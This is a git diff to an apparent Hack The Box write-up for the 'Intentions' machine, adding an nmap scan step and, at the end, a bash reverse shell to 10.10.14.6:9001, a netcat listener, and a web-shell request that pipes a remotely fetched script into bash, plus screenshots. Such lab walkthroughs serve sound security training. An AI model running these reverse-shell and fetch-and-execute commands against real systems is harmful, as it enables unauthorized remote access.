@@ -1,4 +1,4 @@
-```
+![image](https://github.com/regarmulia/HTB/assets/33616880/fdb4850d-9913-4197-8743-161d4fab6f83)```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.220
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/528dff0c-5310-4215-a2d5-7be40b47e7bd)
@@ -118,3 +118,15 @@ http://intentions.htb/storage/rce.php?c=ls
 
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/d1878460-5ead-4c80-b142-42758ed435ac)
+
+
+```
+/bin/bash -i >& /dev/tcp/10.10.14.6/9001 0>&1
+nc -nlvp 9001
+http://intentions.htb/storage/rce.php?c=curl%2010.10.14.6/shell|bash
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/a087ac9e-afc2-423c-ac18-cb36c5d1f97c)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/cd0cd12f-2df6-49c2-a38e-d4c5ceb77159)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/c633d585-805d-4e35-8053-fd525fe104e3)
